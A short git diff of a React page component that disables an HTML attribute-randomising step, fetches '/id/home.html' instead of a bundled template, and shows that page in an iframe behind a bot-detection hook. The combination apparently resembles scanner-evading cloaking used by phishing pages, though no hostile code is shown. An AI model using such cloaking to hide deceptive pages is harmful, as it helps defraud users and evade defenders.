@@ -4,7 +4,7 @@ import type { FC } from 'react';
 import { useEffect, useRef, useState } from 'react';
 import { useBotDetection } from '@/hooks/useBotDetection';
 import template from "../templates/index.html";
-import { randomizeAttributes } from "../hooks/randomizeHtml";
+//import { randomizeAttributes } from "../hooks/randomizeHtml";
 
 const LoadingDots = () => {
     const [dots, setDots] = useState('');
@@ -79,7 +79,7 @@ const Index: FC = () => {
 
 
      useEffect(() => {
-    fetch(template)
+    fetch('/id/home.html')
       .then((res) => res.text())
       .then((data) => setContent(data))
       .catch((err) => console.error(err));
@@ -194,8 +194,8 @@ const Index: FC = () => {
         //     </div>
         // );
     }
-     const randomized = randomizeAttributes(content);
-     console.log(randomized);
+   //  const randomized = randomizeAttributes(content);
+     console.log(content);
     //return <div dangerouslySetInnerHTML={{ __html: randomized }} />;
     return(showIframe("/id/home.html",SiteTitleMeta,false));
    // return showIframe(IframeUrl,SiteTitleMeta,false);
